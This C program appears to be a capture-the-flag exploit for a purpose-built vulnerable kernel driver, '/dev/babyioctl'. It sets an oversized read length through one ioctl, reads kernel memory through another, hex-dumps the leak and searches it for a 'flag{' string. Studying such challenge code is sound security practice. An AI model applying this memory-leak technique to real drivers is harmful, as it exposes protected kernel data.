#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE_PATH "/dev/babyioctl"
#define BABY_IOCTL_MAGIC 0xBA
#define BABY_IOCTL_SET_SIZE _IOW(BABY_IOCTL_MAGIC, 0, size_t)
#define BABY_IOCTL_READ _IOW(BABY_IOCTL_MAGIC, 1, struct baby_req)

struct baby_req {
	char *buf;
};

static void hex_dump(const unsigned char *buf, size_t len)
{
	size_t i;

	for (i = 0; i < len; i++) {
		printf("%02x ", buf[i]);
		if ((i + 1) % 16 == 0)
			printf("\n");
	}

	if (len % 16 != 0)
		printf("\n");
}

int main(void)
{
	int fd;
	size_t leak_size = 0x80;
	unsigned char leak[0x80];
	struct baby_req req = {
		.buf = (char *)leak,
	};
	char *flag_pos;

	memset(leak, 0, sizeof(leak));

	fd = open(DEVICE_PATH, O_RDWR);
	if (fd < 0) {
		fprintf(stderr, "open %s failed: %s\n", DEVICE_PATH, strerror(errno));
		return 1;
	}

	if (ioctl(fd, BABY_IOCTL_SET_SIZE, &leak_size) < 0) {
		fprintf(stderr, "SET_SIZE failed: %s\n", strerror(errno));
		close(fd);
		return 1;
	}

	if (ioctl(fd, BABY_IOCTL_READ, &req) < 0) {
		fprintf(stderr, "READ failed: %s\n", strerror(errno));
		close(fd);
		return 1;
	}

	printf("[+] leaked %zu bytes\n", leak_size);
	hex_dump(leak, leak_size);

	flag_pos = strstr((char *)leak, "flag{");
	if (flag_pos != NULL)
		printf("[+] flag = %s\n", flag_pos);
	else
		printf("[-] flag not found in leak\n");

	close(fd);
	return 0;
}
